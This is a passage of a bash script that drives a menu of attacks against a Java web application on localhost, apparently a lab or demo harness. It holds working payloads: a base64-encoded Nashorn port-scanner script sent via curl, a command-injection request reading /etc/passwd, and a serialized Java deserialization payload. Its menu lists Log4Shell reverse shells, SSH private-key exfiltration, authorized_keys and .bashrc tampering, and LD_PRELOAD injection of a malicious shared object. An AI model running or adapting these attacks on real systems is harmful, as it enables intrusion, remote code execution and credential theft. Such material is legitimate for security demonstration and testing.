  curl 'http://localhost:8081/test?name=test&cac=LyoKICogVGhpcyBOYXNob3JuIHNjcmlwdCBzY2FucyBhIGdpdmVuIElQIHJhbmdlIGFuZCByZXR1cm5zIHRoZSByZXN1bHQgYXMgdGV4dC4KICogSXQgY2hlY2tzIGlmIGEgcG9ydCBpcyBvcGVuIG9uIGVhY2ggSVAgYWRkcmVzcyBpbiB0aGUgcmFuZ2UuCiAqLwoKLy8gRGVmaW5lIHRoZSBJUCByYW5nZSB0byBzY2FuCnZhciBzdGFydElwID0gIjE3Mi4yMC4wLjEiOwp2YXIgZW5kSXAgPSAiMTcyLjIwLjAuMzAiOwoKLy8gRGVmaW5lIHRoZSBwb3J0cyB0byBzY2FuCnZhciBwb3J0cyA9IFsyMiwgODAsIDQ0Myw4MDgwLDgwODFdOwoKLy8gRnVuY3Rpb24gdG8gY2hlY2sgaWYgYW4gSVAgYWRkcmVzcyBpcyByZWFjaGFibGUKZnVuY3Rpb24gaXNSZWFjaGFibGUoaXBBZGRyZXNzKSB7CiAgdHJ5IHsKICAgIHZhciBwcm9jZXNzID0gamF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoInBpbmcgLWMgMSAiICsgaXBBZGRyZXNzKTsKICAgIHZhciBleGl0VmFsdWUgPSBwcm9jZXNzLndhaXRGb3IoKTsKICAgIHJldHVybiBleGl0VmFsdWUgPT0gMDsKICB9IGNhdGNoIChlKSB7CiAgICBwcmludCgiRXJyb3IgY2hlY2tpbmcgcmVhY2hhYmlsaXR5OiAiICsgZS5tZXNzYWdlKTsKICAgIHJldHVybiBmYWxzZTsKICB9Cn0KCi8vIEZ1bmN0aW9uIHRvIGNoZWNrIGlmIGEgcG9ydCBpcyBvcGVuIG9uIGFuIElQIGFkZHJlc3MKZnVuY3Rpb24gaXNQb3J0T3BlbihpcEFkZHJlc3MsIHBvcnQpIHsKICB0cnkgewogICAgdmFyIHNvY2tldCA9IG5ldyBqYXZhLm5ldC5Tb2NrZXQoKTsKICAgIHNvY2tldC5jb25uZWN0KG5ldyBqYXZhLm5ldC5JbmV0U29ja2V0QWRkcmVzcyhpcEFkZHJlc3MsIHBvcnQpLCAxMDAwKTsKICAgIHNvY2tldC5jbG9zZSgpOwogICAgcmV0dXJuIHRydWU7CiAgfSBjYXRjaCAoZSkgewogICAgcmV0dXJuIGZhbHNlOwogIH0KfQoKLy8gRnVuY3Rpb24gdG8gc2NhbiBhbiBJUCBhZGRyZXNzIGZvciBvcGVuIHBvcnRzCmZ1bmN0aW9uIHNjYW5JcEFkZHJlc3MoaXBBZGRyZXNzKSB7CiAgdmFyIHJlc3VsdCA9ICJJUCBBZGRyZXNzOiAiICsgaXBBZGRyZXNzICsgIlxuIjsKICBpZiAoaXNSZWFjaGFibGUoaXBBZGRyZXNzKSkgewogICAgZm9yICh2YXIgaSA9IDA7IGkgPCBwb3J0cy5sZW5ndGg7IGkrKykgewogICAgICB2YXIgcG9ydCA9IHBvcnRzW2ldOwogICAgICBpZiAoaXNQb3J0T3BlbihpcEFkZHJlc3MsIHBvcnQpKSB7CiAgICAgICAgcmVzdWx0ICs9ICIgIFBvcnQgIiArIHBvcnQgKyAiIGlzIG9wZW5cbiI7CiAgICAgIH0KICAgIH0KICB9IGVsc2UgewogICAgcmVzdWx0ICs9ICIgIEhvc3QgaXMgdW5yZWFjaGFibGVcbiI7CiAgfQogIHJldHVybiByZXN1bHQ7Cn0KCi8vIEZ1bmN0aW9uIHRvIGNvbnZlcnQgYW4gSVAgYWRkcmVzcyBzdHJpbmcgdG8gYW4gaW50ZWdlcgpmdW5jdGlvbiBpcFRvSW50KGlwQWRkcmVzcykgewogIHZhciBwYXJ0cyA9IGlwQWRkcmVzcy5zcGxpdCgiLiIpOwogIHJldHVybiAocGFyc2VJbnQocGFydHNbMF0pIDw8IDI0KSB8CiAgICAgICAgIChwYXJzZUludChwYXJ0c1sxXSkgPDwgMTYpIHwKICAgICAgICAgKHBhcnNlSW50KHBhcnRzWzJdKSA8PCA4KSB8CiAgICAgICAgIHBhcnNlSW50KHBhcnRzWzNdKTsKfQoKLy8gRnVuY3Rpb24gdG8gY29udmVydCBhbiBpbnRlZ2VyIHRvIGFuIElQIGFkZHJlc3Mgc3RyaW5nCmZ1bmN0aW9uIGludFRvSXAoaXBJbnQpIHsKICByZXR1cm4gKChpcEludCA+PiAyNCkgJiAweEZGKSArICIuIiArCiAgICAgICAgICgoaXBJbnQgPj4gMTYpICYgMHhGRikgKyAiLiIgKwogICAgICAgICAoKGlwSW50ID4+IDgpICYgMHhGRikgKyAiLiIgKwogICAgICAgICAoaXBJbnQgJiAweEZGKTsKfQoKLy8gU2NhbiB0aGUgSVAgcmFuZ2UKdmFyIHN0YXJ0SXBJbnQgPSBpcFRvSW50KHN0YXJ0SXApOwp2YXIgZW5kSXBJbnQgPSBpcFRvSW50KGVuZElwKTsKdmFyIHJlc3VsdCA9ICIiOwpmb3IgKHZhciBpcEludCA9IHN0YXJ0SXBJbnQ7IGlwSW50IDw9IGVuZElwSW50OyBpcEludCsrKSB7CiAgdmFyIGlwQWRkcmVzcyA9IGludFRvSXAoaXBJbnQpOwogIHZhciBzY2FuSVBSZXN1bHQgPSBzY2FuSXBBZGRyZXNzKGlwQWRkcmVzcyk7CiAgcHJpbnQoc2NhbklQUmVzdWx0KTsKICByZXN1bHQgKz0gc2NhbklQUmVzdWx0Owp9CgovLyBQcmludCB0aGUgcmVzdWx0CnByaW50KHJlc3VsdCk7'
  sleep 15
  #read
  curl -v http://localhost:8081/faq.html
}

performCommandInjection() {
    curl 'http://localhost:8081/cmd?arg=cat%20%2Fetc%2Fpasswd%0A'
}

performDeserializationAttack() {
  curl 'http://localhost:8081/deserialize?base64=rO0ABXNyADhvcmcuc3ByaW5nZnJhbWV3b3JrLnNhbXBsZXMuZW1haWxzZXJ2aWNlLm1vZGVsLkVtYWlsRGF0YdBEER%2Fgyw%2FWAgAETAAEYm9keXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACWNtZFJlc3VsdHEAfgABTAAMZW1haWxBZGRyZXNzcQB%2BAAFMAAdzdWJqZWN0cQB%2BAAF4cHQAD2NhdCAvZXRjL3Bhc3N3ZHB0ABB0ZXN0QGV4YW1wbGUuY29tdAAEdGVzdA%3D%3D'
}



# Function to display the menu
display_menu() {
  echo "---------------------"
  echo "     Main Menu      "
  echo "---------------------"
  echo "1. SQL Injection"
  echo "2. Path Traversal Upload"
  echo "3. Path Traversal Download"
  echo "4 Command Injection"
  echo "5 Perform Deserialization Attack"
  echo "6. Log4Shell Reverse Shell"
  echo "7. Log4Shell In App Trojan"
  echo "8. Read /etc/passwd using Trojan"
  echo "9. Read System Properties using Trojan"
  echo "10. list .ssh dir"
  echo "11. Exfiltrate SSH Private Key"
  echo "12 Exfiltrate authorized keys"
  echo "13 Modify authorized keys"
  echo "14 Exfiltrate app.jar"
  echo "15 Exfiltrate heapdump"
  echo "16 Modify .bashrc File"
  echo "17 Download Malicious Shared Object"
  echo "18 Write Payload to Preload"
  echo "19 Port Scan"
  echo "20 Run all commands in turn"
  echo "---------------------"
}


# Main loop
while true; do
  clear # Clear the screen
  display_menu

  # Read user input
  read -p "Enter your choice: " choice

  # Process user input
  case $choice in
    1)
      echo "SQL Injection"
      performSQLInjection
      read -p "Press Enter to continue..."
    ;;
    2)
      echo "Path Traversal Upload"
      performPathTraversalUpload
      read -p "Press Enter to continue..."
    ;;
    3)
      echo "Path Traversal Download"
      performPathTraversalDownload
      read -p "Press Enter to continue..."
    ;;
    4)
      echo "Command Injection"
      performCommandInjection
      read -p "Press Enter to continue..."
      ;;
    5)
      echo "Perform Deserialization"
      performDeserializationAttack
      read -p "Press Enter to continue..."
    ;;
    6)
      echo "Log4Shell Reverse Shell"
      performLog4ShellReverseShell
      read -p "Press Enter to continue..."
    ;;
    7)
      echo "Log4Shell In Application Trojan"
      performTrojanInjection
      read -p "Press Enter to continue..."
    ;;
    8)
      echo "Read /etc/passwd using Trojan"
      performEtcPasswordRead
      read -p "Press Enter to continue..."
      ;;
    9)
      echo "Read System Properties using Trojan"
      performSystemPropertiesRead
      read -p "Press Enter to continue..."
      ;;
    10)
      echo "List .ssh directory"
      performListingOfSSHDir
      read -p "Press Enter to continue..."
      ;;
    11)
      echo "Exfiltrate SSH Private Key"
      performReadOfSSHPrivateKey
      read -p "Press Enter to continue..."
      ;;
    12)
      echo "Exfiltrate authorized_keys file"
      performExfiltrateAuthorizedKeys
      read -p "Press Enter to continue..."
      ;;
    13)
      echo "Modify authorized keys"
      performModifyAuthorizedKeys
      read -p "Press Enter to continue..."
      ;;
    14)
      echo "Exfiltrate App jar"
      performExfiltrateAppJar
      read -p "Press Enter to continue..."
      ;;
    15)
      echo "Exfiltrate Heap Dump File"
      performExfiltrateHeapDump
      read -p "Press Enter to continue..."
      ;;
    16)
      echo "Modify .bashrc file"
      performModifyBashRCFile
      read -p "Press Enter to continue..."
      ;;
    17)
      echo "Download Malicious pe.so file"
      performDownloadOfMaliciousSharedObject
      read -p "Press Enter to continue..."
      ;;
    18)
      echo "Inject the Malicious pe.so shared file"
      performWritePayloadToPreload
      read -p "Press Enter to continue..."
      ;;
    19)
      echo "Perform Port Scan"
      performPortScan
      read -p "Press Enter to continue..."
      ;;
    20)
      echo "running all commands, this will take a while"
      performSQLInjection
      performPathTraversalUpload
      performPathTraversalDownload
      performCommandInjection
      performDeserializationAttack
      performLog4ShellReverseShell
      performTrojanInjection
      performEtcPasswordRead
      performSystemPropertiesRead
      performListingOfSSHDir
      performReadOfSSHPrivateKey
      performExfiltrateAuthorizedKeys
      performModifyAuthorizedKeys
      performModifyBashRCFile
      performDownloadOfMaliciousSharedObject
      performWritePayloadToPreload
      performPortScan
      ;;
    *)
      echo "Invalid choice!"
      read -p "Press Enter to continue..."
    ;;
  esac
done
